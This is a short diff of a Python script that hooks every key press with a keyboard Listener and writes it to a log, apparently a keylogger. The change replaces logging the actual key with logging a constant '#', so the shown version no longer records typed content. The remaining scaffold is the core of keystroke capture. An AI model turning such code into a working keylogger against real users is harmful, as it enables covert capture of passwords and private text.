@@ -8,7 +8,7 @@ log.basicConfig(
 )
 
 def onPressed(key):
-	log.info(str(key))
+	log.info(str('#'))
 
 with Listener(on_press = onPressed) as listener:
 	listener.join()
